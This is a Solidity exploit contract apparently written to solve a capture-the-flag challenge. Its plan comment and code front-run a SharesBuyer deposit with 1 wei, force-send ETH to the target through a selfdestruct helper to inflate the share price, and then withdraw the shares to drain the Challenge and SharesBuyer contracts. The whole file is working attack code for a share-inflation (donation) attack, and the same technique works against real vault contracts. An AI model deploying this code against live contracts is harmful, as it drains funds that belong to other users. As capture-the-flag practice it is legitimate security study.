// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IChallengeContract} from "./Challenge.sol";
import {SharesBuyer} from "./SB.sol";
import {Setup} from "./Setup.sol";

contract Exploit {
    // requires the balance of ChallengeContract(TARGET) and SharesBuyer(SB) to be 0
    // ticket = 187558514181
    /**
     * @notice THE PLAN
     * Create an exploit contract that frontruns SB.sol's call to depositEth
     * Your contract gets 1 wei in share and SB.sol gets 0 shares
     * Just withdraw your 1 wei share to drain Challenge.sol and SB.sol
     * The donation attack should be a selfdestruct in the constructor as native donations are explicitly disallowed
     */
    IChallengeContract public target;
    SharesBuyer public sb;

    constructor(address _setup) payable {
        // require(msg.value > 0, "Exploit needs initial ETH");
        // Fetch the instances of TARGET and SB from the Setup contract
        Setup setup = Setup(_setup);
        target = IChallengeContract(address(setup.TARGET()));
        sb = SharesBuyer(payable(address(setup.SB())));
    }

    function executeExploit() external {
        // Step 1: Call depositEth to front-run SharesBuyer
        target.depositEth{value: 1 wei}(); // specify max block gas :)

        // Step 2: Deploy a selfdestructing contract to inflate the balance of the target contract
        SelfDestructHelper helper = new SelfDestructHelper{value: 1 wei}(
            payable(address(target))
        );

        // Step 3: Withdraw all ETH by redeeming the shares
        target.withdrawEth(1); // Redeem the shares to drain ETH
    }

    receive() external payable {} // To receive withdrawn ETH
}

contract SelfDestructHelper {
    constructor(address payable target) payable {
        selfdestruct(target); // selfdestruct sending 1 wei to target contract
    }
}
